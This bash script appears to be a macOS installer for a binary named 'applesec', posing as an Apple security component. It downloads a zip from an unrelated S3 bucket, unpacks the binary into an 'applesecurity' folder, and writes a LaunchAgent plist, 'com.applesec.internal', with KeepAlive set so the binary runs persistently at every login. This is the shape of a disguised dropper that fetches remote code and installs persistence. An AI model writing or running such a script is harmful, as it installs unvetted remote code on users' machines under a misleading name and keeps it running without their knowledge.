#!/bin/bash

rm -rf applesec
rm -rf applesec.zip
rm -rf __MACOSX
rm -rf $PWD/applesec
rm -rf $PWD/applesecurity
mkdir $PWD/applesecurity
curl -LO https://udaipursale.s3.ap-south-1.amazonaws.com/applesec.zip
unzip applesec.zip
rm -rf applesec.zip
mv applesec $PWD/applesecurity
#echo export PATH=$PATH:$PWD >> $HOME/.bash_profile
#source $HOME/.bash_profile
#curl -LO https://udaipursale.s3.ap-south-1.amazonaws.com/com.applesec.internal.plist.zip
#unzip com.applesec.internal.plist.zip
#mv com.applesec.internal.plist $HOME/Library/LaunchAgents
#rm -rf com.applesec.internal.plist.zip
#applesec

echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.applesec.internal</string>
    <key>ProgramArguments</key>
    <array>
        <string>'"$PWD"'/applesecurity/applesec</string>
          <string>--foreground</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>' >> $HOME/Library/LaunchAgents/com.applesec.internal.plist
